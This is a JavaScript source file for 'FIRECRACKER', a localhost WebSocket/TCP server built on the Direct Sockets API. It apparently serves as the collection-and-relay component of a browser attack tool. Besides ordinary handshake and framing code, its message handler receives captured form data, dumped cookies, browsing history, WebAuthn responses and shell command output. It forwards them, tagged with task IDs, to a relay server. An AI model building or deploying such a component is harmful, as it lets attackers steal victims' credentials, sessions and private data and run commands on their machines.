/**
 * FIRECRACKER WebSocket Server
 * Uses Direct Sockets API to create a WebSocket server
 * @see direct-sockets.d.ts for type definitions
 * 
 * Test with:
 * - WebSocket: const ws = new WebSocket('ws://127.0.0.1:8080'); ws.send('test');
 * - TCP: telnet 127.0.0.1 8080
 * 
 * All responses are prefixed with "FIRECRACKER: "
 */

export class FirecrackerWebSocketServer {
    constructor(port = null, logCallback = null) {
        this.serverSocket = null;
        this.clientConnections = new Map();
        // Note that per the spec (https://wicg.github.io/direct-sockets/#example-13), the port must be > 32678 to work
        this.port = port || process.env.FIRECRACKER_PORT || 38899;
        this.isRunning = false;
        this.connectionCounter = 0;
        this.logCallback = logCallback || console.log;
        
        // WebSocket magic string for handshake
        this.WS_MAGIC_STRING = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
        
        // Message chunking support
        this.incomingChunks = new Map(); // chunkId -> {chunks: [], totalChunks: 0, totalSize: 0}
        
        this.log(`FIRECRACKER: Initializing WebSocket server on port ${this.port}`);
    }

    /**
     * Internal logging method that uses callback
     */
    log(message, ...args) {
        if (this.logCallback) {
            this.logCallback(message, ...args);
        }
    }

    /**
     * Start the WebSocket server
     */
    async start() {
        try {
            // Create TCP server socket using Direct Sockets API
            this.serverSocket = new TCPServerSocket("127.0.0.1", {
                localPort: this.port
            });

            this.log(`FIRECRACKER: Created server socket`);

            // Wait for server to open
            const openInfo = await this.serverSocket.opened;
            this.log(`FIRECRACKER: Server listening on ${openInfo.localAddress}:${openInfo.localPort}`);
            
            this.isRunning = true;

            // Start accepting connections
            this.acceptConnections(openInfo.readable);

        } catch (error) {
            this.log("FIRECRACKER: Failed to start server:", error);
            throw error;
        }
    }

    /**
     * Accept incoming connections using ReadableStream
     */
    async acceptConnections(connectionStream) {
        this.log("FIRECRACKER: Starting to accept connections...");
        const reader = connectionStream.getReader();
        
        try {
            while (this.isRunning) {
                this.log("FIRECRACKER: Waiting for next connection...");
                const { value: tcpSocket, done } = await reader.read();
                
                if (done) {
                    this.log("FIRECRACKER: Connection stream ended");
                    break;
                }
                
                // Handle new connection
                const connectionId = ++this.connectionCounter;
                this.log(`FIRECRACKER: New connection accepted: ${connectionId}`);
                this.handleNewConnection(tcpSocket, connectionId);
            }
        } catch (error) {
            this.log("FIRECRACKER: Error accepting connections:", error);
        } finally {
            reader.releaseLock();
        }
    }

    /**
     * Handle new client connection
     */
    async handleNewConnection(tcpSocket, connectionId) {
        try {
            // Wait for socket to open
            const openInfo = await tcpSocket.opened;
            this.log(`FIRECRACKER: Client connected from ${openInfo.remoteAddress}:${openInfo.remotePort}`);

            const connectionInfo = {
                connectionId,
                tcpSocket,
                openInfo,
                isWebSocket: false,
                writer: openInfo.writable.getWriter(),
                buffer: new Uint8Array(0)
            };

            this.clientConnections.set(connectionId, connectionInfo);
            
            // Start reading data from this connection
            this.readFromConnection(connectionInfo);
            
        } catch (error) {
            this.log(`FIRECRACKER: Error handling connection ${connectionId}:`, error);
        }
    }

    /**
     * Read data from a connection using ReadableStream
     */
    async readFromConnection(connectionInfo) {
        const reader = connectionInfo.openInfo.readable.getReader();
        
        try {
            while (this.isRunning && this.clientConnections.has(connectionInfo.connectionId)) {
                const { value: data, done } = await reader.read();
                
                if (done) {
                    this.log(`FIRECRACKER: Connection ${connectionInfo.connectionId} closed by client`);
                    break;
                }
                
                this.handleClientData(connectionInfo, data);
            }
        } catch (error) {
            this.log(`FIRECRACKER: Error reading from connection ${connectionInfo.connectionId}:`, error);
        } finally {
            reader.releaseLock();
            this.handleConnectionClose(connectionInfo.connectionId);
        }
    }

    /**
     * Handle incoming data from client
     */
    handleClientData(connectionInfo, data) {
        // Convert data to Uint8Array for consistent handling
        let dataArray;
        if (data instanceof Uint8Array) {
            dataArray = data;
        } else if (data instanceof ArrayBuffer) {
            dataArray = new Uint8Array(data);
        } else {
            dataArray = new Uint8Array(data);
        }
        
        if (!connectionInfo.isWebSocket) {
            // Convert to string for HTTP/WebSocket handshake processing
            const dataString = new TextDecoder().decode(dataArray);
            this.log(`FIRECRACKER: Received data from ${connectionInfo.connectionId}:`, dataString.substring(0, 200) + (dataString.length > 200 ? '...' : ''));
            
            // Check if this is a WebSocket handshake (case insensitive)
            if (dataString.toLowerCase().includes('upgrade: websocket')) {
                this.log(`FIRECRACKER: Detected WebSocket handshake from ${connectionInfo.connectionId}`);
                this.handleWebSocketHandshake(connectionInfo, dataString);
            } else {
                this.log(`FIRECRACKER: Treating as TCP connection from ${connectionInfo.connectionId}`);
                // Regular TCP echo
                this.sendTcpEcho(connectionInfo, dataString);
            }
        } else {
            // Handle WebSocket frame data
            this.log(`FIRECRACKER: Received WebSocket data from ${connectionInfo.connectionId} (${dataArray.length} bytes)`);
            
            // Add to buffer
            const newBuffer = new Uint8Array(connectionInfo.buffer.length + dataArray.length);
            newBuffer.set(connectionInfo.buffer);
            newBuffer.set(dataArray, connectionInfo.buffer.length);
            connectionInfo.buffer = newBuffer;
            
            // Try to process complete frames from buffer
            this.processWebSocketBuffer(connectionInfo);
        }
    }

    /**
     * Process WebSocket frames from buffer
     */
    processWebSocketBuffer(connectionInfo) {
        let buffer = connectionInfo.buffer;
        let offset = 0;
        
        while (offset < buffer.length) {
            // Try to parse a frame starting at offset
            const frameData = buffer.slice(offset);
            const frameBuffer = frameData.buffer.slice(frameData.byteOffset, frameData.byteOffset + frameData.byteLength);
            
            // Calculate frame length
            const frameLength = this.calculateWebSocketFrameLength(frameBuffer);
            if (frameLength === -1) {
                // Invalid frame, skip this byte and continue
                this.log(`FIRECRACKER: Invalid WebSocket frame at offset ${offset}, skipping`);
                offset += 1;
                continue;
            }
            
            if (frameLength === 0) {
                // Need more data
                break;
            }
            
            if (frameData.length < frameLength) {
                // Frame is incomplete, wait for more data
                break;
            }
            
            // We have a complete frame
            const completeFrame = frameData.slice(0, frameLength);
            const completeFrameBuffer = completeFrame.buffer.slice(completeFrame.byteOffset, completeFrame.byteOffset + completeFrame.byteLength);
            
            // Process the complete frame
            this.handleWebSocketMessage(connectionInfo, completeFrameBuffer);
            
            // Move to next frame
            offset += frameLength;
        }
        
        // Remove processed data from buffer
        if (offset > 0) {
            connectionInfo.buffer = buffer.slice(offset);
        }
    }

    /**
     * Calculate the total length of a WebSocket frame
     * Returns -1 for invalid frame, 0 for incomplete frame, or frame length
     */
    calculateWebSocketFrameLength(arrayBuffer) {
        if (arrayBuffer.byteLength < 2) {
            return 0; // Need more data
        }
        
        const view = new DataView(arrayBuffer);
        const secondByte = view.getUint8(1);
        const masked = (secondByte & 0x80) === 0x80;
        let payloadLength = secondByte & 0x7F;
        
        let headerLength = 2;
        
        // Handle extended payload length
        if (payloadLength === 126) {
            if (arrayBuffer.byteLength < 4) {
                return 0; // Need more data
            }
            payloadLength = view.getUint16(2);
            headerLength = 4;
        } else if (payloadLength === 127) {
            if (arrayBuffer.byteLength < 10) {
                return 0; // Need more data
            }
            payloadLength = view.getUint32(6); // Use only lower 32 bits
            headerLength = 10;
        }
        
        // Add masking key length if masked
        if (masked) {
            headerLength += 4;
        }
        
        if (arrayBuffer.byteLength < headerLength) {
            return 0; // Need more data
        }
        
        return headerLength + payloadLength;
    }

    /**
     * Handle WebSocket handshake
     */
    async handleWebSocketHandshake(connectionInfo, request) {
        this.log(`FIRECRACKER: Processing WebSocket handshake from ${connectionInfo.connectionId}`);
        this.log(`FIRECRACKER: Request headers:`, request.split('\r\n').slice(0, 10));
        
        // Extract WebSocket key
        const keyMatch = request.match(/Sec-WebSocket-Key:\s*([^\r\n]+)/i);
        if (!keyMatch) {
            this.log("FIRECRACKER: Invalid WebSocket handshake - no Sec-WebSocket-Key found");
            this.log("FIRECRACKER: Request was:", request);
            this.closeConnection(connectionInfo.connectionId);
            return;
        }

        const key = keyMatch[1].trim();
        this.log(`FIRECRACKER: WebSocket key: ${key}`);
        
        // Generate accept key
        const acceptKey = await this.generateAcceptKey(key);
        this.log(`FIRECRACKER: Generated accept key: ${acceptKey}`);
        
        // Create handshake response
        const response = [
            'HTTP/1.1 101 Switching Protocols',
            'Upgrade: websocket', 
            'Connection: Upgrade',
            `Sec-WebSocket-Accept: ${acceptKey}`,
            '',
            ''
        ].join('\r\n');

        this.log(`FIRECRACKER: Sending handshake response:`, response.split('\r\n'));

        // Send handshake response
        const responseBuffer = new TextEncoder().encode(response);
        try {
            await connectionInfo.writer.write(responseBuffer);
            this.log(`FIRECRACKER: WebSocket handshake completed for ${connectionInfo.connectionId}`);
            connectionInfo.isWebSocket = true;
        } catch (error) {
            this.log(`FIRECRACKER: Failed to send handshake response:`, error);
            this.closeConnection(connectionInfo.connectionId);
        }
    }

    /**
     * Generate WebSocket accept key using proper SHA-1 + base64
     */
    async generateAcceptKey(key) {
        const combined = key + this.WS_MAGIC_STRING;
        
        // Use Web Crypto API for proper SHA-1 hashing
        const encoder = new TextEncoder();
        const data = encoder.encode(combined);
        const hashBuffer = await crypto.subtle.digest('SHA-1', data);
        
        // Convert to base64
        const hashArray = new Uint8Array(hashBuffer);
        let binary = '';
        for (let i = 0; i < hashArray.length; i++) {
            binary += String.fromCharCode(hashArray[i]);
        }
        return btoa(binary);
    }

    /**
     * Handle WebSocket message
     */
    handleWebSocketMessage(connectionInfo, data) {
        try {
            // Convert Uint8Array to ArrayBuffer if needed
            let arrayBuffer;
            if (data instanceof ArrayBuffer) {
                arrayBuffer = data;
            } else if (data instanceof Uint8Array) {
                arrayBuffer = data.buffer.slice(data.byteOffset, data.byteOffset + data.byteLength);
            } else {
                // Convert other types to Uint8Array first, then to ArrayBuffer
                const uint8Array = new Uint8Array(data);
                arrayBuffer = uint8Array.buffer.slice(uint8Array.byteOffset, uint8Array.byteOffset + uint8Array.byteLength);
            }

            // Parse WebSocket frame
            const frame = this.parseWebSocketFrame(arrayBuffer);
            if (!frame) {
                this.log("FIRECRACKER: Failed to parse WebSocket frame");
                return;
            }

            this.log(`FIRECRACKER: WebSocket message from ${connectionInfo.connectionId}: "${frame.payload}"`);

            // Handle different frame types
            if (frame.opcode === 1) {
                this.processWebSocketMessage(frame.payload);
            } else if (frame.opcode === 8) {
                // Close frame
                this.log(`FIRECRACKER: Received close frame from ${connectionInfo.connectionId}`);
                this.handleConnectionClose(connectionInfo.connectionId);
            } else if (frame.opcode === 9) {
                // Ping frame - respond with pong
                this.log(`FIRECRACKER: Received ping frame from ${connectionInfo.connectionId}`);
                this.sendWebSocketPong(connectionInfo, frame.payload);
            } else if (frame.opcode === 10) {
                // Pong frame - just log it
                this.log(`FIRECRACKER: Received pong frame from ${connectionInfo.connectionId}`);
            } else {
                this.log(`FIRECRACKER: Received unknown frame type ${frame.opcode} from ${connectionInfo.connectionId}`);
            }

        } catch (error) {
            this.log("FIRECRACKER: Error handling WebSocket message:", error);
            this.log("FIRECRACKER: Data type:", typeof data, "Data constructor:", data.constructor.name);
            this.log("FIRECRACKER: Data length:", data.length || data.byteLength);
        }
    }


    processWebSocketMessage(message) {
        const MESSAGE_TYPE_FORM_DATA = 'form_data';
        const MESSAGE_TYPE_LS_COMMAND_RESP = 'ls_command_response';
        const MESSAGE_TYPE_SHELL_COMMAND_RESP = 'shell_command_response';
        const MESSAGE_TYPE_DUMP_COOKIES_RESP = 'dump_cookies_response';
        const MESSAGE_TYPE_DUMP_HISTORY_RESP = 'dump_history_response';  
        const MESSAGE_TYPE_WEB_AUTHN_RESP = 'webauthn_response';
        
        // Chunking message types
        const MESSAGE_TYPE_CHUNK_START = 'chunk_start';
        const MESSAGE_TYPE_CHUNK_DATA = 'chunk_data';
        const MESSAGE_TYPE_CHUNK_END = 'chunk_end';

        this.log(`FIRECRACKER: Received message: ${message.substring(0, 200)}${message.length > 200 ? '...' : ''}`);

        let messageObject;
        try {
            messageObject = JSON.parse(message);
        } catch (error) {
            this.log(`FIRECRACKER: Error parsing JSON: ${error.message}`);
            return;
        }

        // Handle chunked messages
        switch (messageObject.type) {
            case MESSAGE_TYPE_CHUNK_START:
                this.handleChunkStart(messageObject);
                return;
            case MESSAGE_TYPE_CHUNK_DATA:
                this.handleChunkData(messageObject);
                return;
            case MESSAGE_TYPE_CHUNK_END:
                this.handleChunkEnd(messageObject);
                return;
        }

        // Handle regular messages
        switch (messageObject.type) {
            case MESSAGE_TYPE_FORM_DATA:
                window.getRelayServer().sendCapturedData(messageObject.type, messageObject.data);
                break;
            case MESSAGE_TYPE_LS_COMMAND_RESP:
            case MESSAGE_TYPE_SHELL_COMMAND_RESP:
            case MESSAGE_TYPE_DUMP_COOKIES_RESP:
            case MESSAGE_TYPE_DUMP_HISTORY_RESP:
            case MESSAGE_TYPE_WEB_AUTHN_RESP:
                window.getRelayServer().sendCommandResponse(messageObject.type, messageObject.data, messageObject.taskId);
                break;
            default:
                this.log(`FIRECRACKER: Unknown message type: ${messageObject.type}`);
                break;
        }
    }

    /**
     * Handle chunk start message
     */
    handleChunkStart(messageObject) {
        const chunkId = messageObject.chunkId;
        const totalSize = messageObject.totalSize;
        
        this.log(`FIRECRACKER: Starting chunk reassembly for ${chunkId}, total size: ${totalSize} bytes`);
        
        this.incomingChunks.set(chunkId, {
            chunks: [],
            totalChunks: 0,
            totalSize: totalSize,
            receivedChunks: 0
        });
    }

    /**
     * Handle chunk data message
     */
    handleChunkData(messageObject) {
        const chunkId = messageObject.chunkId;
        const chunkNum = messageObject.chunkNum;
        const data = messageObject.data;
        
        const chunkInfo = this.incomingChunks.get(chunkId);
        if (!chunkInfo) {
            this.log(`FIRECRACKER: Received chunk data for unknown chunk ID: ${chunkId}`);
            return;
        }
        
        // Store chunk in correct position
        chunkInfo.chunks[chunkNum] = data;
        chunkInfo.receivedChunks++;
        
        this.log(`FIRECRACKER: Received chunk ${chunkNum} for ${chunkId} (${chunkInfo.receivedChunks} chunks received)`);
    }

    /**
     * Handle chunk end message
     */
    handleChunkEnd(messageObject) {
        const chunkId = messageObject.chunkId;
        const totalChunks = messageObject.totalChunks;
        
        const chunkInfo = this.incomingChunks.get(chunkId);
        if (!chunkInfo) {
            this.log(`FIRECRACKER: Received chunk end for unknown chunk ID: ${chunkId}`);
            return;
        }
        
        chunkInfo.totalChunks = totalChunks;
        
        this.log(`FIRECRACKER: Reassembling ${totalChunks} chunks for ${chunkId}`);
        
        // Check if we have all chunks
        if (chunkInfo.receivedChunks !== totalChunks) {
            this.log(`FIRECRACKER: Missing chunks for ${chunkId}: expected ${totalChunks}, got ${chunkInfo.receivedChunks}`);
            this.incomingChunks.delete(chunkId);
            return;
        }
        
        // Reassemble the message
        let reassembledMessage = '';
        for (let i = 0; i < totalChunks; i++) {
            if (chunkInfo.chunks[i] === undefined) {
                this.log(`FIRECRACKER: Missing chunk ${i} for ${chunkId}`);
                this.incomingChunks.delete(chunkId);
                return;
            }
            reassembledMessage += chunkInfo.chunks[i];
        }
        
        this.log(`FIRECRACKER: Successfully reassembled message for ${chunkId}: ${reassembledMessage.length} bytes`);
        
        // Clean up
        this.incomingChunks.delete(chunkId);
        
        // Process the reassembled message
        this.processWebSocketMessage(reassembledMessage);
    }

    /**
     * Parse WebSocket frame (simplified implementation)
     */
    parseWebSocketFrame(data) {
        try {
            const view = new DataView(data);
            
            if (data.byteLength < 2) {
                this.log("FIRECRACKER: Frame too short, need at least 2 bytes");
                return null;
            }
            
            const firstByte = view.getUint8(0);
            const secondByte = view.getUint8(1);
            
            const fin = (firstByte & 0x80) === 0x80;
            const opcode = firstByte & 0x0F;
            const masked = (secondByte & 0x80) === 0x80;
            let payloadLength = secondByte & 0x7F;
            
            this.log(`FIRECRACKER: Frame - FIN: ${fin}, Opcode: ${opcode}, Masked: ${masked}, PayloadLength: ${payloadLength}`);
            
            let offset = 2;
            
            // Handle extended payload length
            if (payloadLength === 126) {
                if (data.byteLength < offset + 2) {
                    this.log("FIRECRACKER: Frame too short for extended length (126)");
                    return null;
                }
                payloadLength = view.getUint16(offset);
                offset += 2;
                this.log(`FIRECRACKER: Extended payload length: ${payloadLength}`);
            } else if (payloadLength === 127) {
                if (data.byteLength < offset + 8) {
                    this.log("FIRECRACKER: Frame too short for extended length (127)");
                    return null;
                }
                payloadLength = view.getUint32(offset + 4); // Use only lower 32 bits
                offset += 8;
                this.log(`FIRECRACKER: Extended payload length (64-bit): ${payloadLength}`);
            }
            
            // Handle masking key
            let maskingKey = null;
            if (masked) {
                if (data.byteLength < offset + 4) {
                    this.log("FIRECRACKER: Frame too short for masking key");
                    return null;
                }
                maskingKey = new Uint8Array(data, offset, 4);
                offset += 4;
                this.log(`FIRECRACKER: Masking key: ${Array.from(maskingKey).map(b => b.toString(16).padStart(2, '0')).join(' ')}`);
            }
            
            // Extract payload
            if (data.byteLength < offset + payloadLength) {
                this.log(`FIRECRACKER: Frame too short for payload. Expected: ${offset + payloadLength}, Got: ${data.byteLength}`);
                return null;
            }
            
            const payload = new Uint8Array(data, offset, payloadLength);
            
            // Unmask payload if needed
            if (masked && maskingKey) {
                for (let i = 0; i < payload.length; i++) {
                    payload[i] ^= maskingKey[i % 4];
                }
            }
            
            // Only decode text frames (opcode 1)
            let decodedPayload = '';
            if (opcode === 1) {
                decodedPayload = new TextDecoder('utf-8').decode(payload);
            } else if (opcode === 8) {
                decodedPayload = '[CLOSE FRAME]';
            } else if (opcode === 9) {
                decodedPayload = '[PING FRAME]';
            } else if (opcode === 10) {
                decodedPayload = '[PONG FRAME]';
            } else {
                decodedPayload = `[UNKNOWN OPCODE ${opcode}]`;
            }
            
            return {
                fin,
                opcode,
                payload: decodedPayload
            };
            
        } catch (error) {
            this.log("FIRECRACKER: Error parsing WebSocket frame:", error);
            return null;
        }
    }

    /**
     * Send WebSocket message
     */
    async sendWebSocketMessage(connectionInfo, message) {
        try {
            const payload = new TextEncoder().encode(message);
            let frame;
            
            this.log(`FIRECRACKER: Sending WebSocket message to ${connectionInfo.connectionId}: "${message}" (${payload.length} bytes)`);
            
            // Create frame based on payload length
            if (payload.length < 126) {
                frame = new ArrayBuffer(2 + payload.length);
                const view = new DataView(frame);
                // First byte: FIN (1) + RSV (000) + Opcode (0001 for text)
                view.setUint8(0, 0x81);
                // Second byte: MASK (0) + Payload length
                view.setUint8(1, payload.length);
                // Copy payload
                new Uint8Array(frame, 2).set(payload);
            } else if (payload.length < 65536) {
                frame = new ArrayBuffer(4 + payload.length);
                const view = new DataView(frame);
                view.setUint8(0, 0x81);
                view.setUint8(1, 126);
                view.setUint16(2, payload.length);
                // Copy payload
                new Uint8Array(frame, 4).set(payload);
            } else {
                // For simplicity, we'll limit to 65535 bytes
                this.log("FIRECRACKER: Message too large, truncating to 65535 bytes");
                const truncatedPayload = payload.slice(0, 65535);
                frame = new ArrayBuffer(4 + truncatedPayload.length);
                const view = new DataView(frame);
                view.setUint8(0, 0x81);
                view.setUint8(1, 126);
                view.setUint16(2, truncatedPayload.length);
                new Uint8Array(frame, 4).set(truncatedPayload);
            }
            
            await connectionInfo.writer.write(new Uint8Array(frame));
            this.log(`FIRECRACKER: WebSocket message sent successfully to ${connectionInfo.connectionId}`);
            
        } catch (error) {
            this.log(`FIRECRACKER: Failed to send WebSocket message to ${connectionInfo.connectionId}:`, error);
            // If the connection is broken, clean it up
            if (error.name === 'NetworkError' || error.message.includes('closed')) {
                this.log(`FIRECRACKER: Connection ${connectionInfo.connectionId} appears to be broken, cleaning up`);
                this.handleConnectionClose(connectionInfo.connectionId);
            }
        }
    }

    /**
     * Send WebSocket pong frame
     */
    async sendWebSocketPong(connectionInfo, pingPayload = '') {
        try {
            const payload = new TextEncoder().encode(pingPayload);
            let frame;
            
            // Create pong frame (opcode 10)
            if (payload.length < 126) {
                frame = new ArrayBuffer(2 + payload.length);
                const view = new DataView(frame);
                // First byte: FIN (1) + RSV (000) + Opcode (1010 for pong)
                view.setUint8(0, 0x8A);
                // Second byte: MASK (0) + Payload length
                view.setUint8(1, payload.length);
                // Copy payload
                if (payload.length > 0) {
                    new Uint8Array(frame, 2).set(payload);
                }
            } else {
                // For simplicity, limit pong payload to 125 bytes
                const truncatedPayload = payload.slice(0, 125);
                frame = new ArrayBuffer(2 + truncatedPayload.length);
                const view = new DataView(frame);
                view.setUint8(0, 0x8A);
                view.setUint8(1, truncatedPayload.length);
                new Uint8Array(frame, 2).set(truncatedPayload);
            }
            
            await connectionInfo.writer.write(new Uint8Array(frame));
            this.log(`FIRECRACKER: WebSocket pong sent to ${connectionInfo.connectionId}`);
            
        } catch (error) {
            this.log(`FIRECRACKER: Failed to send WebSocket pong:`, error);
        }
    }

    /**
     * Send TCP echo response
     */
    async sendTcpEcho(connectionInfo, message) {
        const echoMessage = `FIRECRACKER: ${message}`;
        const buffer = new TextEncoder().encode(echoMessage);
        
        try {
            await connectionInfo.writer.write(buffer);
            this.log(`FIRECRACKER: TCP echo sent to ${connectionInfo.connectionId}`);
        } catch (error) {
            this.log(`FIRECRACKER: Failed to send TCP echo:`, error);
        }
    }

    /**
     * Handle connection close
     */
    async handleConnectionClose(connectionId) {
        this.log(`FIRECRACKER: Connection closed: ${connectionId}`);
        const connectionInfo = this.clientConnections.get(connectionId);
        
        if (connectionInfo) {
            try {
                // Close the writer
                await connectionInfo.writer.close();
                // Close the TCP socket
                await connectionInfo.tcpSocket.close();
            } catch (error) {
                this.log(`FIRECRACKER: Error closing connection ${connectionId}:`, error);
            }
            
            this.clientConnections.delete(connectionId);
        }
    }

    /**
     * Close a connection
     */
    async closeConnection(connectionId) {
        await this.handleConnectionClose(connectionId);
    }

    /**
     * Stop the server
     */
    async stop() {
        if (!this.isRunning) return;

        this.log("FIRECRACKER: Stopping server...");
        this.isRunning = false;

        // Close all client connections
        for (const [connectionId] of this.clientConnections) {
            await this.closeConnection(connectionId);
        }

        // Close server socket
        if (this.serverSocket !== null) {
            try {
                await this.serverSocket.close();
            } catch (error) {
                this.log("FIRECRACKER: Error closing server socket:", error);
            }
            this.serverSocket = null;
        }

        this.log("FIRECRACKER: Server stopped");
    }

    /**
     * Get server status
     */
    getStatus() {
        return {
            isRunning: this.isRunning,
            port: this.port,
            connectedClients: this.clientConnections.size
        };
    }
}

// Global instance
let firecrackerServer = null;

// Export getter for server instance
export function getFirecrackerServer() {
    return firecrackerServer;
}

// Initialize server when script loads
export async function initializeFirecrackerServer(logCallback = null) {
    
    try {
        firecrackerServer = new FirecrackerWebSocketServer(null, logCallback);
        await firecrackerServer.start();
        firecrackerServer.log("FIRECRACKER: Server initialized successfully");
        return firecrackerServer;
    } catch (error) {
        firecrackerServer.log("FIRECRACKER: Failed to initialize server:", error);
        return null;
    }
}

